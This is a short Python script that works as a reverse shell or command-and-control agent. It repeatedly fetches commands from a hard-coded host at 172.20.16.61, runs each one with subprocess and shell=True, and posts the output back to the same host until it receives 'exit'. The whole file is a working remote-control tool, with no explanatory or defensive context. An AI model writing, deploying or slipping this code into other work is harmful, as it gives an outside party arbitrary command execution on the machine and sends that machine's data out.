import requests
import subprocess
import time


while True:
    req = requests.get('http://172.20.16.61:80')
    command = req.text

    if 'exit' in command:
        break
    else:
        result = subprocess.run(command, shell=True, capture_output=True)
        requests.post(url='http://172.20.16.61:80', data = result.stdout)
        time.sleep(3)